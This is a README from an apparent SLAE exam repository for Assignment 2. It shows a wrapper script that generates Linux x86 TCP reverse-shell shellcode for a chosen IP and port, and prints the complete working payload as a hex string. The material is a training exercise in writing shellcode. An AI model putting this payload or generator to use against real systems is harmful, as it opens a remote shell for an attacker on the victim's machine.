# SLAE
Repository for the SLAE exam  
Student **SLAE-891**  
[http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)  
  
## Assignment 2
Shell_Reverse_TCP Shellcode  
  
You can customize the listening port and generate the TCP reverse shellcode with the following command:  
```bash
./wrapper.sh
Usage: ./wrapper.sh <ip> <port_number> <template_file>
```
```bash
./wrapper.sh 127.0.0.1 2048 ./shell_reverse_tcp.template
----------------------------
[*] HEXFMTPORT:0800
[*] HEXFMTPORT1:0x08
[*] HEXFMTPORT2:dl
[*] HEXFMTIP1:0x7f
[*] HEXFMTIP2:dl
[*] HEXFMTIP3:dl
[*] HEXFMTIP4:0x1
----------------------------

[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
"\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\xc6\x04\x24\x7f\x88\x54\x24\x01\x88\x54\x24\x02\xc6\x44\x24\x03\x01\x66\x52\xc6\x04\x24\x08\x88\x54\x24\x01\x66\x6a\x02\x89\xe3\x6a\x10\x53\x57\x31\xdb\xf7\xe3\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x89\xfb\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
```  
  

